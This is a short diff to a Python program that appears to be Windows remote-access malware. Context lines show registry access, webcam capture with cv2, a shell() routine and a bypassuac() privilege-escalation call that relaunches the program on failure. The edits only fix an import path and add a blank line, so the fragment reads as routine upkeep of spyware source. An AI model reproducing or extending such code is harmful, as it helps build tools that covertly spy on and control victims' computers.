@@ -8,7 +8,7 @@ import shutil
 from winreg import *
 import sys, subprocess, os
 
-from Scripts.bottle import unicode
+from bottle import unicode
 from cv2 import VideoCapture,imwrite
 from  os.path import isfile
 import random
@@ -955,6 +955,7 @@ def shell():
                     if bypassuac() == True:
                         sys.exit()
                     else:
+
                         os.startfile(sys.executable)
                         sys.exit()
                 else:
